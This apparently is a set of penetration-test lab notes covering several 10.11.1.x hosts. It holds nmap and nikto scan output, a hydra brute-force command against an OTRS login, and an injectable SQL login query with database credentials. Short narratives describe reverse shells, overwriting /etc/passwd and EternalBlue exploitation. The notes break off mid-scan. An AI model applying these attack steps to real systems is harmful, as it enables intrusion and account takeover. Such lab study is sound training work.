&quot;PROVIDER=SQLOLEDB;DATA SOURCE=RALPH;User ID=sa;PWD=poiuytrewq;DATABASE=bankdb&quot;<br />sSql = &quot;SELECT * FROM tblCustomers where cust_name=&#39;&quot; &amp; myUsrName &amp; &quot;&#39; and cust_password=&#39;&quot;&amp;myUsrPassword&amp;&quot;&#39;&quot; <br /><br />sqsh -S 10.11.1.31 -U sa -P poiuytrewq<br /><br /><br />network-secret<br />7eab8563146f16140c769072580cbcb3<br />proof<br />dec04ea1c0d39acd7a53c543540b0a3a</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.31 &amp;&amp; nmap -sC -sV -Pn 10.11.1.31 &amp;&amp; nmap -p- -Pn 10.11.1.31<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-29 12:35 EDT<br />Nmap scan report for 10.11.1.31<br />Host is up (0.069s latency).<br />Not shown: 994 filtered ports<br />PORT     STATE SERVICE<br />80/tcp   open  http<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />445/tcp  open  microsoft-ds<br />1433/tcp open  ms-sql-s<br />3389/tcp open  ms-wbt-server<br /><br />Nmap done: 1 IP address (1 host up) scanned in 6.19 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-29 12:35 EDT<br />Nmap scan report for 10.11.1.31<br />Host is up (0.063s latency).<br />Not shown: 994 filtered ports<br />PORT     STATE SERVICE       VERSION<br />80/tcp   open  http          Microsoft IIS httpd 10.0<br />| http-cookie-flags: <br />|   /: <br />|     ASPSESSIONIDCQRTDQRC: <br />|_      httponly flag not set<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />|_http-title: Login<br />135/tcp  open  msrpc         Microsoft Windows RPC<br />139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br />445/tcp  open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds<br />1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM<br />| ms-sql-ntlm-info: <br />|   Target_Name: RALPH<br />|   NetBIOS_Domain_Name: RALPH<br />|   NetBIOS_Computer_Name: RALPH<br />|   DNS_Domain_Name: ralph<br />|   DNS_Computer_Name: ralph<br />|_  Product_Version: 10.0.14393<br />| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br />| Not valid before: 2020-03-31T16:51:41<br />|_Not valid after:  2050-03-31T16:51:41<br />|_ssl-date: 2020-04-29T16:34:25+00:00; -2m07s from scanner time.<br />3389/tcp open  ms-wbt-server Microsoft Terminal Services<br />| rdp-ntlm-info: <br />|   Target_Name: RALPH<br />|   NetBIOS_Domain_Name: RALPH<br />|   NetBIOS_Computer_Name: RALPH<br />|   DNS_Domain_Name: ralph<br />|   DNS_Computer_Name: ralph<br />|   Product_Version: 10.0.14393<br />|_  System_Time: 2020-04-29T16:33:45+00:00<br />| ssl-cert: Subject: commonName=ralph<br />| Not valid before: 2020-04-25T14:36:39<br />|_Not valid after:  2020-10-25T14:36:39<br />|_ssl-date: 2020-04-29T16:34:24+00:00; -2m08s from scanner time.<br />Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -2m07s, deviation: 0s, median: -2m07s<br />| ms-sql-info: <br />|   10.11.1.31:1433: <br />|     Version: <br />|       name: Microsoft SQL Server 2017 RTM<br />|       number: 14.00.1000.00<br />|       Product: Microsoft SQL Server 2017<br />|       Service pack level: RTM<br />|       Post-SP patches applied: false<br />|_    TCP port: 1433<br />| smb-os-discovery: <br />|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br />|   Computer name: ralph<br />|   NetBIOS computer name: RALPH\x00<br />|   Workgroup: WORKGROUP\x00<br />|_  System time: 2020-04-29T16:33:45+00:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-04-29T16:33:48<br />|_  start_date: 2020-03-31T16:51:33<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 54.05 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-29 12:36 EDT<br />Nmap scan report for 10.11.1.31<br />Host is up (0.063s latency).<br />Not shown: 65526 filtered ports<br />PORT      STATE SERVICE<br />80/tcp    open  http<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />1433/tcp  open  ms-sql-s<br />3389/tcp  open  ms-wbt-server<br />5985/tcp  open  wsman<br />49666/tcp open  unknown<br />49667/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 134.61 seconds<br /></div><div class='page'><h1 class='title level-4'>pictures</h1><br/><br /><a href=""><img src="images/945-1.png" alt="images/945-1.png" /></a><br /><br /><a href=""><img src="images/945-2.png" alt="images/945-2.png" /></a><br /><br /><a href=""><img src="images/945-3.png" alt="images/945-3.png" /></a><br /><br /><a href=""><img src="images/945-4.png" alt="images/945-4.png" /></a><br /><br /><a href=""><img src="images/945-5.png" alt="images/945-5.png" /></a><br /><br /><a href=""><img src="images/945-6.png" alt="images/945-6.png" /></a><br /><br /><a href=""><img src="images/945-7.png" alt="images/945-7.png" /></a><br /><br /><a href=""><img src="images/945-8.png" alt="images/945-8.png" /></a><br /><br /><a href=""><img src="images/945-9.png" alt="images/945-9.png" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>10.11.1.35 Pain rooted</h1><br/>An nmap scan showed that only port 22 and 80 were open.<br />After navigating to the website Chris noticed that if you hovered over the links you could see there was a php call happening on /section.php?page=xxxxx.<br />When he replaced the non-existing file (xxxxx) with /etc/passwd he was able to dump /etc/passwd to screen.<br />He then hosted a simple php script echoing “Hello World” to the screen which he was able to reach and have executed via the target.<br />Becasue he was not able to get a stable php reverse shell he wrote a php script to upload and execute a python reverse shell script which was successful and got him a reverse shell as apache.<br />During enumeration he saw that the SUID bit for cp was set to run as root.<br />On Chris&#39;s local machine using openssl he created a line with his own creds for root to replace the one that was currently there.<br />Once he echoed that line into a .txt file on the target he copied that file over the real /etc/passwd.<br />He then was able to su to root.<br /><br /><br />99d8f4f10cf80eed5cb67e73e8b60a3d</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>users<br />bob<br />justin<br /><br /><br />/etc/httpd/conf/httpd.conf<br /><br />99d8f4f10cf80eed5cb67e73e8b60a3d</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.35 &amp;&amp; nmap -sC -sV -Pn 10.11.1.35 &amp;&amp; nmap -p- -Pn 10.11.1.35<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-29 16:10 EDT<br />Nmap scan report for 10.11.1.35<br />Host is up (0.069s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1.29 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-29 16:10 EDT<br />Nmap scan report for 10.11.1.35<br />Host is up (0.077s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 45:4a:21:25:8c:04:dc:c8:48:76:0c:52:77:14:6c:73 (RSA)<br />|   256 a0:b8:2d:0f:07:79:36:47:ac:9f:bf:53:9b:0f:87:eb (ECDSA)<br />|_  256 ee:06:c5:14:bc:2f:ae:9e:1e:0b:88:cd:3f:12:e0:6d (ED25519)<br />80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 11.34 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-29 16:10 EDT<br />Nmap scan report for 10.11.1.35<br />Host is up (0.075s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 89.82 seconds<br /></div><div class='page'><h1 class='title level-5'>nikto</h1><br/>nikto -host http://10.11.1.35:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.35<br />+ Target Hostname:    10.11.1.35<br />+ Target Port:        80<br />+ Start Time:         2020-04-29 16:10:49 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ PHP/5.4.16 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.<br />+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST, TRACE <br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-3268: /files/: Directory indexing found.<br />+ OSVDB-3092: /files/: This might be interesting...<br />+ OSVDB-3268: /icons/: Directory indexing found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 8724 requests: 0 error(s) and 11 item(s) reported on remote host<br />+ End Time:           2020-04-29 16:23:03 (GMT-4) (734 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-4'>pictures</h1><br/><br /><a href=""><img src="images/949-1.png" alt="images/949-1.png" /></a><br /><br /><a href=""><img src="images/949-2.png" alt="images/949-2.png" /></a><br /><br /><a href=""><img src="images/949-3.png" alt="images/949-3.png" /></a><br /><br /><a href=""><img src="images/949-4.png" alt="images/949-4.png" /></a><br /><br /><a href=""><img src="images/949-5.png" alt="images/949-5.png" /></a><br /><br /><a href=""><img src="images/949-6.png" alt="images/949-6.png" /></a><br /><br /><a href=""><img src="images/949-7.png" alt="images/949-7.png" /></a><br /><br /><a href=""><img src="images/949-8.png" alt="images/949-8.png" /></a><br /><br /><a href=""><img src="images/949-9.png" alt="images/949-9.png" /></a></div><div class='page'><h1 class='title level-3'>10.11.1.39 LeftTurn.thinc rooted</h1><br/>An nmap scan showed that ports 22, 80, and 3306 were open.<br />Upon enumeration of the webserver when navigating to robots.txt you were forwarded to bat.txt.<br />Changeing the useragent to Googlebot-News allowed us to view robots.txt which showed us the existince of the otrs directory.<br />Directory brute forceing showed that there were four abailable pages.<br />Because there was no other obvious way of entry, the tester used cewl to create a wordlist from the four pages and crafted a hydra command to brute force against the default username root@localhost.<br />hydra -l root@localhost -P yee.txt 10.11.1.39 http-post-form -e nsr &quot;/otrs/index.pl:Action=Login&amp;RequestedURL=Action%3DAdmin&amp;Lang=en&amp;TimeOffset=240&amp;User=^USER^&amp;Password=^PASS^:F=Login failed?&quot;<br />The creds root@localhost:otrs were displayed and functioned.<br />The known vulnerability for otrs5 involving changeing the function of PGP and then executing gave the tester a reverse shell on the machine as apache.<br /><a href="https://www.exploit-db.com/exploits/43853">https://www.exploit-db.com/exploits/43853</a><br />Once with a reverse shell the tester noticed that he could write to /etc/passwd.<br />On his local machine he was able to create a new /etc/passwd file, but with credentials he knew for root, then replace the old /etc/passwd with the new one.<br />He then logged on via ssh as root with the new credetials.<br /><br />1dcca23355272056f04fe8bf20edfce0</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack nginx 1.6.3<br />|_http-server-header: nginx/1.6.3<br /><br /><br />otrs 5<br />OTRS 5.0.2<br /><br />hydra -l root@localhost -P yee.txt 10.11.1.39 http-post-form -e nsr &quot;/otrs/index.pl:Action=Login&amp;RequestedURL=Action%3DAdmin&amp;Lang=en&amp;TimeOffset=240&amp;User=^USER^&amp;Password=^PASS^:F=Login failed?&quot;</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.39 &amp;&amp; nmap -sC -sV -Pn 10.11.1.39 &amp;&amp; nmap -p- -Pn 10.11.1.39<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-30 11:20 EDT<br />Nmap scan report for 10.11.1.39<br />Host is up (0.068s latency).<br />Not shown: 997 filtered ports<br />PORT     STATE SERVICE<br />22/tcp   open  ssh<br />80/tcp   open  http<br />3306/tcp open  mysql<br /><br />Nmap done: 1 IP address (1 host up) scanned in 13.62 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-30 11:20 EDT<br />Nmap scan report for 10.11.1.39<br />Host is up (0.066s latency).<br />Not shown: 997 filtered ports<br />PORT     STATE SERVICE VERSION<br />22/tcp   open  ssh     OpenSSH 6.6.1 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 5e:c1:7e:d2:f9:20:f9:11:ea:4b:02:68:07:3f:54:f2 (RSA)<br />|   256 36:ef:27:31:a2:fd:4a:e3:d2:4e:12:58:1f:7a:03:58 (ECDSA)<br />|_  256 2c:70:9c:c9:4c:50:61:d2:51:43:d5:67:d1:d0:39:de (ED25519)<br />80/tcp   open  http    nginx 1.6.3<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: nginx/1.6.3<br />|_http-title: Apache HTTP Server Test Page powered by CentOS<br />3306/tcp open  mysql   MariaDB (unauthorized)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 21.42 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-30 11:21 EDT<br />Nmap scan report for 10.11.1.39<br />Host is up (1.6s latency).<br />Not shown: 65532 filtered ports<br />PORT     STATE SERVICE<br />22/tcp   open  ssh<br />80/tcp   open  http<br />3306/tcp open  mysql<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1595.72 seconds</div><div class='page'><h1 class='title level-4'>Pictures</h1><br/><br /><a href=""><img src="images/957-1.png" alt="images/957-1.png" /></a><br /><br /> <a href=""><img src="images/957-2.png" alt="images/957-2.png" /></a><br /> <br /> <a href=""><img src="images/957-3.png" alt="images/957-3.png" /></a><br /> <br /> <a href=""><img src="images/957-4.png" alt="images/957-4.png" /></a><br /><br /><a href=""><img src="images/957-5.png" alt="images/957-5.png" /></a><br /><br /><a href=""><img src="images/957-6.png" alt="images/957-6.png" /></a><br /><a href=""><img src="images/957-7.png" alt="images/957-7.png" /></a><br /><br /><a href=""><img src="images/957-8.png" alt="images/957-8.png" /></a><br /><br /><a href=""><img src="images/957-9.png" alt="images/957-9.png" /></a><br /><br /><a href=""><img src="images/957-10.png" alt="images/957-10.png" /></a><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>10.11.1.73 Gamma rooted</h1><br/>An nmap scan showed that many ports were open including smb ports, multiple web ports, vnc, and on port 1100 java-rmi.<br />Upon further enuemration of the java-rmi port, nmap disclosed that the port was in fact a RMI server that allowed the rmi registry to be dumped.<br />This behavior is indicitive a potential Java deserialization vulnerability.<br />Utilizing BaRMIe.jar Chris was able to exploit the deserialization vulnerability and run a powershell command to execute a powershell script in memory to get him a reverse shell as nt authority\system<br /><br /><br /><br /><br /><br />e18a24030ad7c23250b41c2fd257c71e</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>Windows 7 Professional 7601 Service Pack 1 microsoft-ds<br />10.11.1.73 is 32-bit<br /></div><div class='page'><h1 class='title level-5'>nmap</h1><br/>Not shown: 982 filtered ports<br />PORT      STATE SERVICE<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />554/tcp   open  rtsp<br />1100/tcp  open  mctp<br />2869/tcp  open  icslap<br />3306/tcp  open  mysql<br />5357/tcp  open  wsdapi<br />5800/tcp  open  vnc-http<br />5900/tcp  open  vnc<br />8080/tcp  open  http-proxy<br />10243/tcp open  unknown<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49156/tcp open  unknown<br />49157/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 5.43 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-01 11:26 EDT<br />Nmap scan report for 10.11.1.73<br />Host is up (0.082s latency).<br />Not shown: 982 filtered ports<br />PORT      STATE SERVICE      VERSION<br />135/tcp   open  msrpc        Microsoft Windows RPC<br />139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn<br />445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)<br />554/tcp   open  rtsp?<br />|_rtsp-methods: ERROR: Script execution failed (use -d to debug)<br />1100/tcp  open  java-rmi     Java RMI<br />| rmi-dumpregistry: <br />|   creamtec/ajaxswing/JVMFactory<br />|     com.creamtec.ajaxswing.core.JVMFactory_Stub<br />|     @10.11.1.73:49157<br />|     extends<br />|       java.rmi.server.RemoteStub<br />|       extends<br />|_        java.rmi.server.RemoteObject<br />2869/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />3306/tcp  open  mysql        MySQL (unauthorized; French)<br />5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />|_http-title: Service Unavailable<br />5800/tcp  open  vnc-http     TightVNC (user: gamma; VNC TCP port: 5900)<br />|_http-title: TightVNC desktop [gamma]<br />5900/tcp  open  vnc          VNC (protocol 3.8)<br />|_ssl-cert: ERROR: Script execution failed (use -d to debug)<br />|_ssl-date: ERROR: Script execution failed (use -d to debug)<br />|_sslv2: ERROR: Script execution failed (use -d to debug)<br />|_tls-alpn: ERROR: Script execution failed (use -d to debug)<br />|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)<br />|_vnc-info: ERROR: Script execution failed (use -d to debug)<br />8080/tcp  open  http         Apache httpd 2.4.9 ((Win32) PHP/5.5.12)<br />|_http-open-proxy: Proxy might be redirecting requests<br />| http-robots.txt: 1 disallowed entry <br />|_/testmysql.php<br />|_http-server-header: Apache/2.4.9 (Win32) PHP/5.5.12<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />10243/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />|_http-title: Not Found<br />49152/tcp open  msrpc        Microsoft Windows RPC<br />49153/tcp open  msrpc        Microsoft Windows RPC<br />49154/tcp open  msrpc        Microsoft Windows RPC<br />49155/tcp open  msrpc        Microsoft Windows RPC<br />49156/tcp open  msrpc        Microsoft Windows RPC<br />49157/tcp open  java-rmi     Java RMI<br />Service Info: Host: GAMMA; OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -2m22s, deviation: 3s, median: -2m24s<br />| smb-os-discovery: <br />|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)<br />|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional<br />|   Computer name: gamma<br />|   NetBIOS computer name: GAMMA\x00<br />|   Workgroup: WORKGROUP\x00<br />|_  System time: 2020-05-01T15:25:58+00:00<br />| smb-security-mode: <br />|   account_used: &lt;blank&gt;<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-05-01T15:25:54<br />|_  start_date: 2020-03-18T14:04:13<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 206.37 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-01 11:29 EDT<br />Nmap scan report for 10.11.1.73<br />Host is up (0.077s latency).<br />Not shown: 65515 filtered ports<br />PORT      STATE SERVICE<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />554/tcp   open  rtsp<br />1100/tcp  open  mctp<br />2869/tcp  open  icslap<br />3306/tcp  open  mysql<br />5357/tcp  open  wsdapi<br />5800/tcp  open  vnc-http<br />5900/tcp  open  vnc<br />8014/tcp  open  unknown<br />8080/tcp  open  http-proxy<br />10243/tcp open  unknown<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49156/tcp open  unknown<br />49157/tcp open  unknown<br />49181/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 146.52 seconds<br /></div><div class='page'><h1 class='title level-6'>web</h1><br/></div><div class='page'><h1 class='title level-7'>5357</h1><br/>PORT     STATE SERVICE REASON  VERSION<br />5357/tcp open  http    syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /></div><div class='page'><h1 class='title level-7'>2869</h1><br/>PORT     STATE SERVICE REASON  VERSION<br />2869/tcp open  http    syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /></div><div class='page'><h1 class='title level-7'>8080</h1><br/>RT     STATE SERVICE REASON  VERSION<br />8080/tcp open  http    syn-ack Apache httpd 2.4.9 ((Win32) PHP/5.5.12)<br />|_http-server-header: Apache/2.4.9 (Win32) PHP/5.5.12<br /><br /><br /><br />robots<br />User-agent: *<br />Disallow: /testmysql.php<br /><br />User-agent: *<br />Allow: /PHP/<br /><br /><br />nikto -host http://10.11.1.73:8080<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.73<br />+ Target Hostname:    10.11.1.73<br />+ Target Port:        8080<br />+ Start Time:         2020-05-01 11:37:16 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.9 (Win32) PHP/5.5.12<br />+ Retrieved x-powered-by header: PHP/5.5.12<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Entry &#39;/testmysql.php&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Cookie OV4260859958 created without the httponly flag<br />+ Entry &#39;/PHP/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ &quot;robots.txt&quot; contains 2 entries which should be manually viewed.<br />+ Apache/2.4.9 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ PHP/5.5.12 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.<br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ Cookie OV4027342154 created without the httponly flag<br />+ OSVDB-3092: /php/: This might be interesting...<br />+ OSVDB-3233: /php/index.php: Monkey Http Daemon default PHP file found.<br />+ 8730 requests: 0 error(s) and 15 item(s) reported on remote host<br />+ End Time:           2020-05-01 11:50:00 (GMT-4) (764 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-7'>10243</h1><br/>PORT      STATE SERVICE REASON  VERSION<br />10243/tcp open  http    syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</div><div class='page'><h1 class='title level-4'>Pictures</h1><br/><br /><a href=""><img src="images/981-1.png" alt="images/981-1.png" /></a><br /><br /><a href=""><img src="images/981-2.png" alt="images/981-2.png" /></a><br /><br /><a href=""><img src="images/981-3.png" alt="images/981-3.png" /></a><br /><br /><a href=""><img src="images/981-4.png" alt="images/981-4.png" /></a></div><div class='page'><h1 class='title level-3'>10.11.1.75 Bruce rooted</h1><br/>Nmap showed that smb was open.<br />Nmap smb vuln scan showed that the machine was vulnerable to eternal blue<br />Windows 8, so psexec should work here.<br />msfconsole, use exploit/windows/smb/ms17_010_psexec<br />did not work with windows/meterpreter/reverse_tcp payload<br />windows/meterpreter/bind_tcp worked swimmingly!<br />rooted.<br /><br /><br />1f88aa9e73f267356f033a42d9320b50</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>hostname BRUCE<br />domain BRUCE<br />x64</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1m1e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.75 &amp;&amp; nmap -sC -sV -Pn 10.11.1.75 &amp;&amp; nmap -p- -Pn 10.11.1.75<br />1<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-06 13:09 EDT<br />Nmap scan report for 10.11.1.75<br />Host is up (0.085s latency).<br />Not shown: 989 filtered ports<br />PORT      STATE SERVICE<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />3389/tcp  open  ms-wbt-server<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49156/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 7.29 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-06 13:09 EDT<br />Nmap scan report for 10.11.1.75<br />Host is up (0.098s latency).<br />Not shown: 989 filtered ports<br />PORT      STATE SERVICE            VERSION<br />135/tcp   open  msrpc              Microsoft Windows RPC<br />139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn<br />445/tcp   open  microsoft-ds       Windows 8.1 Enterprise 9600 microsoft-ds (workgroup: WORKGROUP)<br />3389/tcp  open  ssl/ms-wbt-server?<br />|_ssl-date: 2020-05-06T17:09:14+00:00; -2m00s from scanner time.<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49156/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br />Service Info: Host: BRUCE; OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -1m58s, deviation: 1s, median: -2m00s<br />|_nbstat: NetBIOS name: BRUCE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:9f:9d:15 (VMware)<br />| smb-os-discovery: <br />|   OS: Windows 8.1 Enterprise 9600 (Windows 8.1 Enterprise 6.3)<br />|   OS CPE: cpe:/o:microsoft:windows_8.1::-<br />|   Computer name: bruce<br />|   NetBIOS computer name: BRUCE\x00<br />|   Workgroup: WORKGROUP\x00<br />|_  System time: 2020-05-06T17:08:19+00:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-05-06T17:08:20<br />|_  start_date: 2020-03-31T16:37:24<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 185.42 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-06 13:12 EDT<br />Nmap scan report for 10.11.1.75<br />Host is 